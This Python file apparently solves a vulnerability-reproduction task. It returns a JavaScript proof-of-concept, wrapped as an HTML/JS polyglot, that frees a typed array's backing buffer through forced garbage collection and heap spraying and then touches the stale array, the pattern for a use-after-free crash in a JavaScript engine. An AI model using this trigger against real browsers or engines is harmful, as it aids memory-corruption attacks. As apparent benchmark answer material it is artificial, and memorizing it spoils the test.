import os
import tarfile
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        payload = r'''(function(){
function get_ta(){
  try{
    if(typeof ImageData==="function"){
      let img=new ImageData(128,128);
      let a=img.data;
      img=null;
      return a;
    }
  }catch(e){}
  if(typeof Uint8ClampedArray==="function"){
    let ab=new ArrayBuffer(0x8000);
    let a=new Uint8ClampedArray(ab);
    ab=null;
    return a;
  }
  if(typeof document!=="undefined"&&document.createElement){
    try{
      let c=document.createElement("canvas");
      c.width=16;c.height=16;
      let ctx=c.getContext&&c.getContext("2d");
      if(ctx&&ctx.getImageData){
        let id=ctx.getImageData(0,0,16,16);
        let a=id.data;
        id=null;
        return a;
      }
    }catch(e){}
  }
  return null;
}
function force_gc(){
  let f=globalThis.gc||globalThis.collectGarbage||globalThis.collect_garbage;
  if(typeof f==="function"){for(let i=0;i<10;i++)f();}
  for(let i=0;i<12000;i++)new ArrayBuffer(0x1000);
  if(typeof f==="function"){for(let i=0;i<10;i++)f();}
}
let ta=get_ta();
if(!ta)return;
globalThis.__keep=ta;
force_gc();
for(let i=0;i<2000;i++)new ArrayBuffer(0x2000);
let b=ta.buffer;
ta[0]=1;
let x=ta[0]|0;
if(b)x^=(b.byteLength|0);
globalThis.__x=x;
})();'''
        poc = "/*<script>\n" + payload + "\n</script>*/\n" + payload + "\n"
        return poc.encode("utf-8", "strict")